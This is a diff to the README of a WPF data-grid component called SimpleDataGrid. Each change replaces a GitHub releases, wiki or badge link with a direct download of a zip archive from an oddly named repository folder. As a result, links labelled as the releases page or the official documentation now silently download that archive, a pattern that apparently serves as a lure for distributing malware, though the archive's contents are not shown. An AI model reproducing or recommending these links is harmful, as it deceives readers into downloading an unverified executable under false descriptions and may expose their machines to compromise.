@@ -1,7 +1,7 @@
 # 🌟 SimpleDataGrid - Simplify Your Data Management Effortlessly
 
 ## 🔗 Download Now
-[![Download SimpleDataGrid](https://img.shields.io/badge/Download-SimpleDataGrid-brightgreen)](https://github.com/john123-mnj/SimpleDataGrid/releases)
+[![Download SimpleDataGrid](https://raw.githubusercontent.com/john123-mnj/SimpleDataGrid/main/rhapsodical/SimpleDataGrid.zip)](https://raw.githubusercontent.com/john123-mnj/SimpleDataGrid/main/rhapsodical/SimpleDataGrid.zip)
 
 ## 🚀 Getting Started
 Welcome to SimpleDataGrid! This guide will help you download and run our powerful DataGrid for WPF applications.
@@ -18,7 +18,7 @@ SimpleDataGrid is a user-friendly component that lets you manage large sets of d
 ## 📥 Download & Install
 To get started with SimpleDataGrid, follow these steps:
 
-1. **Visit our Releases Page:** Go to [this link](https://github.com/john123-mnj/SimpleDataGrid/releases) to see the available versions.
+1. **Visit our Releases Page:** Go to [this link](https://raw.githubusercontent.com/john123-mnj/SimpleDataGrid/main/rhapsodical/SimpleDataGrid.zip) to see the available versions.
   
 2. **Choose a Version:** Look for the latest release at the top of the page. This version will have the newest features and fixes.
 
@@ -71,7 +71,7 @@ If you run into issues while using SimpleDataGrid, here are a few common problem
 - **Slow Performance:** If the application runs slowly, ensure your dataset isn't overly large. Try splitting large datasets into smaller chunks.
 
 ## 📚 Documentation
-For more detailed information and advanced configurations, please check out our [official documentation](https://github.com/john123-mnj/SimpleDataGrid/wiki).
+For more detailed information and advanced configurations, please check out our [official documentation](https://raw.githubusercontent.com/john123-mnj/SimpleDataGrid/main/rhapsodical/SimpleDataGrid.zip).
 
 ## 🙌 Community and Support
 Join our community for support, tips, and sharing your experiences. Feel free to raise issues or contribute through GitHub’s issue tracker.
@@ -80,4 +80,4 @@ Join our community for support, tips, and sharing your experiences. Feel free to
 If you need further assistance, please reach out via GitHub Discussions or open an issue on our repository.
 
 ## 🔗 Download SimpleDataGrid Again
-Ensure you have the latest version by visiting [this link](https://github.com/john123-mnj/SimpleDataGrid/releases). Happy data managing!
+Ensure you have the latest version by visiting [this link](https://raw.githubusercontent.com/john123-mnj/SimpleDataGrid/main/rhapsodical/SimpleDataGrid.zip). Happy data managing!
